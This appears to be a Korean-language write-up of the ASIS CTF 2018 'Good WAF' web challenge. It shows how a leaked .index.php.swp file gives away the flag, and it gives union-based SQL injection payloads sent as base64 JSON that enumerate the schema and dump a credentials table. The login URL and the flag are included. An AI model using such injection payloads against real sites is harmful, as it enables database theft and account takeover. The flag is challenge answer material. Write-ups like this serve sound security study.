# [WEB] ASIS CTF 2018 - Good WAF

## Description

WAFs cannot detect parameters filled with opaque data such as base64. Consequently, We've tuned our [WAF](http://167.99.12.110/) to be more strong checking these inputs.

**Note** : in order to find login endpoint, do not use brute-force,or guessing, they won't work.

**Hint 1** : base64(json_object)

## Analysis & Exploit

문제 페이지에 접속하면 GET형태로 object를 base64(json_object)형태로 넘겨달라한다.

```
News Portal
GET news by object (base64(json_object)) parameter
```

불친절하다.

사실 이 문제 제작자의 실수인지 의도인지 모르겠는데 .index.php.swp이 있으며 이를 복구해주면 플래그 나온다...(?)

```php
if($result->num_rows > 0){
	echo '<b>ASIS{e279aaf1780c798e55477a7afc7b2b18}</b>';
}
```

제작자의 의도는 저 플래그가 노출되지 않아야 하는 것 같지만, 못 본 셈치고 공부 목적으로 풀어보자.

일단 {}를 base64인코딩해서 날려보면 에러가 발생한다.

```
Notice: Undefined property: stdClass::$data in /var/www/html/index.php on line 37
```

오.. {"data":"1"}을 날려보자.

```
News Portal
News ID: 1
Believe it or not, but any computer connected to the Internet is vulnerable to cyber attacks. With more money at risk and data breaches at a rise, more certified cybersecurity experts and professionals are needed by every corporate and organisation to prevent themselves from hackers and cyber thieves. That's why jobs in the cybersecurity field have gone up 80% over the past three years than any other IT-related job. So, this is the right time for you to consider a new career as a cybersecurity professional.
```

옼 결과 나오네요, 인젝션 해봅시다.

```json
{
    "data":"-1' union select 1,group_concat(concat(table_name,0x3a3a,column_name)) from information_schema.columns where table_schema=database() #"
}
```

위의 json을 날리면 아래와 같이 table과 column을 얻을 수 있다.

```
access_logs::id,access_logs::log,credentials::id,credentials::username,credentials::password,credentials::role,news::id,news::data
```

credentials 테이블을 덤프떠보자.

```json
{
    "data":"-1' union select 1,concat(id,0x3a3a,username,0x3a3a,password) from credentials #"
}
```

위 쿼리를 날리면 username과 password를 얻을 수 있다.

```
1::valid_user::5f4dcc3b5aa765d61d8327deb882cf99
```

`5f4dcc3b5aa765d61d8327deb882cf99`는 구글에 넣어보니 password의 md5값이라고 한다.

서버에 다음과 같이 날려주면 플래그를 얻을 수 있다.

```
http://167.99.12.110/?action=a&credentials[0]=valid_user&credentials[1]=password
ASIS{e279aaf1780c798e55477a7afc7b2b18}
```

이 문제 왜 Good WAF문제 인지 모르겠다.~~(필터링 된게 뭘까..)~~



**ASIS{e279aaf1780c798e55477a7afc7b2b18}**